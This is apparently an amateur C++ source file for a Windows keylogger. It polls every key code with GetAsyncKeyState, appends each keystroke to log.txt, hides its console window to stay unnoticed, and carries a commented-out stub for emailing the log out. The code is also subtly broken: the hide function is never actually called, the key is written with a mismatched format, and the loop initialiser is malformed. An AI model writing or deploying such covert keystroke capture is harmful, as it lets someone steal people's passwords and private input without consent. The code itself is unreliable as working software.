

#include <iostream>
#include<fstream>
#include <Windows.h>
#include <time.h>
#include<direct.h>
#include "main.h"

#pragma warning(disable : 4996)

//^this disables the error message about the key saving method not being safe

void logfile(int key)
{
	//TODO: create a new path for the logging file
	
	FILE* log;
	log = fopen("log.txt", "a+");//a+ to create a file if it doesnt exist and writes at then end.
	fprintf(log, "%s", &key);
	fclose(log);
	
	
	
}


void hideconsole() 
{
	ShowWindow(GetConsoleWindow(), 0);
	//hides the console window to keep the application hidden
	Sleep(1000);//mill seconds
	ShowWindow(GetConsoleWindow(), 1);// test purporses 


}

/*void emailSender(std::string sender, std::fstream file, bool result)
{

}
*/
int main()
{	


	hideconsole;




	bool running = true;
	while (running == true)
	{
		int i= 1;
		//using ascii
		for (i > 8; i <=255; i++) // starts and end of the mainly used ascii char
		{

			if (GetAsyncKeyState(i)== -32767)
			{
				logfile(i);
				//TODO improve saving mechinishm 
				//add special characters ect...


			}
		}
		

	}


	
	
	return 0;
}
